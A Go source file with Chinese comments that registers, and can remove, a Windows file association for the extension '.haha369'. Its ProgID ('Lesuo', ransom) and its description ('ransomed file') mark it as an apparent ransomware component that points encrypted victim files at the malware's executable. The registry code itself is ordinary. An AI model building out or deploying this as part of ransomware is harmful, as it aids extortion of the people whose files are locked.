package defaults

import (
	"fmt"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

// 设置文件关联
func associateFileExtension(extension, progID, description, applicationPath string) error {
	// 打开 HKEY_CURRENT_USER\Software\Classes
	classesRoot, err := registry.OpenKey(registry.CURRENT_USER, `Software\Classes`, registry.SET_VALUE|registry.CREATE_SUB_KEY)
	if err != nil {
		return fmt.Errorf("无法打开 ClassesRoot: %v", err)
	}
	defer classesRoot.Close()

	// 1. 设置扩展名的默认值为 ProgID
	extKey, _, err := registry.CreateKey(classesRoot, extension, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("无法创建/打开扩展名键 %s: %v", extension, err)
	}
	defer extKey.Close()

	if err := extKey.SetStringValue("", progID); err != nil {
		return fmt.Errorf("无法设置扩展名默认值: %v", err)
	}

	// 2. 创建 ProgID 键并设置描述
	progIDKey, _, err := registry.CreateKey(classesRoot, progID, registry.SET_VALUE|registry.CREATE_SUB_KEY)
	if err != nil {
		return fmt.Errorf("无法创建/打开 ProgID 键 %s: %v", progID, err)
	}
	defer progIDKey.Close()

	if err := progIDKey.SetStringValue("", description); err != nil {
		return fmt.Errorf("无法设置 ProgID 描述: %v", err)
	}

	// 3. 设置默认图标（可选）
	iconPath := fmt.Sprintf(`%s,0`, applicationPath)
	iconKey, _, err := registry.CreateKey(progIDKey, `DefaultIcon`, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("无法创建/打开 DefaultIcon 键: %v", err)
	}
	defer iconKey.Close()

	if err := iconKey.SetStringValue("", iconPath); err != nil {
		return fmt.Errorf("无法设置 DefaultIcon 值: %v", err)
	}

	// 4. 设置打开方式
	commandKey, _, err := registry.CreateKey(progIDKey, `shell\open\command`, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("无法创建/打开 shell\\open\\command 键: %v", err)
	}
	defer commandKey.Close()

	// 使用双引号包裹路径以支持路径中有空格的情况
	command := fmt.Sprintf(`"%s" "%%1"`, applicationPath)
	if err := commandKey.SetStringValue("", command); err != nil {
		return fmt.Errorf("无法设置打开命令: %v", err)
	}

	return nil
}

// 取消文件关联
func disassociateFileExtension(extension, progID string) error {
	// 打开 HKEY_CURRENT_USER\Software\Classes
	classesRoot, err := registry.OpenKey(registry.CURRENT_USER, `Software\Classes`, registry.SET_VALUE|registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return fmt.Errorf("无法打开 ClassesRoot: %v", err)
	}
	defer classesRoot.Close()

	// 删除扩展名关联的键
	if err := registry.DeleteKey(classesRoot, extension); err != nil {
		// 如果键不存在，则忽略该错误
		if err != registry.ErrNotExist {
			fmt.Printf("删除扩展名键 %s 失败: %v\n", extension, err)
		}
	}

	// 递归删除 ProgID 关联的键
	if err := deleteRegistryKeyRecursive(classesRoot, progID); err != nil {
		return fmt.Errorf("删除 ProgID 键失败: %v", err)
	}

	return nil
}

// 递归删除指定路径的注册表键及其子键
func deleteRegistryKeyRecursive(root registry.Key, path string) error {
	// 尝试打开指定的键
	key, err := registry.OpenKey(root, path, registry.ENUMERATE_SUB_KEYS|registry.SET_VALUE)
	if err != nil {
		if err == registry.ErrNotExist {
			return nil
		}
		return err
	}

	// 获取所有子键
	subkeys, err := key.ReadSubKeyNames(-1)
	key.Close() // 关闭已打开的键
	if err != nil {
		return err
	}

	// 递归删除所有子键
	for _, sub := range subkeys {
		subPath := filepath.Join(path, sub)
		if err := deleteRegistryKeyRecursive(root, subPath); err != nil {
			return err
		}
	}

	// 删除当前键
	return registry.DeleteKey(root, path)
}

func Guanlian() {
	// 获取当前程序的完整路径
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("无法获取可执行文件路径：", err)
		return
	}
	exePath, err = filepath.Abs(exePath)
	if err != nil {
		fmt.Println("无法获取可执行文件绝对路径：", err)
		return
	}

	// 定义文件关联参数
	extension := ".haha369"
	progID := "Lesuo.haha369"
	description := "被勒索的文件"
	applicationPath := exePath

	// 进行文件关联
	if err := associateFileExtension(extension, progID, description, applicationPath); err != nil {
		fmt.Println("设置文件关联失败：", err)
	} else {
		fmt.Printf("成功将 %s 文件类型关联到 %s\n", extension, applicationPath)
	}
}

// 取消关联调用示例
func QuxiaoGuanlian() {
	extension := ".haha369"
	progID := "Lesuo.haha369"

	if err := disassociateFileExtension(extension, progID); err != nil {
		fmt.Println("取消文件关联失败：", err)
	} else {
		fmt.Printf("成功取消了 %s 文件类型的关联\n", extension)
	}
}
